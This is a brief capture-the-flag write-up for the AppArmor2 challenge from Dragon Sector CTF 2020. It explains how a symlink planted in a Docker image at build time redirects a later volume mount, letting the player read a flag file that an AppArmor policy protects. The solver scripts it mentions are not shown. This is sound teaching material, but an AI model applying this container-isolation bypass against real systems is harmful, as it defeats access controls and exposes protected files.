### Writeup for the AppArmor2 task from Dragon Sector CTF 2020
This is a very short writeup to the "AppArmor2" challenge from the [Dragon Sector CTF 2020](https://ctftime.org/event/1082), solved by disconnect3d from justCatTheFish ctf team.

In this CTF challenge, there was a custom AppArmor policy applied to the run containers, such that it disallowed reads/writes to `/flag-*` paths.

We, as a user, could only provide a docker image that was built and run later on, and the flag (which we wanted to steal) was mounted as a volume into the run container with a `docker run -v /flag.txt:/flag-XXYY ...` invocation. The `XXYY` part was random.

### Solution

The solver is in `./solve.sh`. When running for first time, you need to:
* update the (referenced) docker image name in `build.sh` and the `<<YOURIP>>` part
* login to gitlab docker registry (`docker login`) and share your project with `dragonsectorclient` (that's how you shared the docker image with the challenge, and the challenge pulled and run it later on)

The *bug* here is that AppArmor denies read/write/etc to `/flag-*` but this limitation is enforced during container run time **but not during its build time AND that Docker will follow symlinks present in the image when mounting files with `docker run -v /hostpath:/containerpath ...`**.

So it turns out that when the `docker run -v something:somepath ...` is invoked, the `somepath` follows links and we can make a link from `/flag-XXYY` to `/D` in our image. In the end, the `docker run -v /flag.txt:/flag-XXYY ...` will mount `flag.txt` into `/D` which we can read.
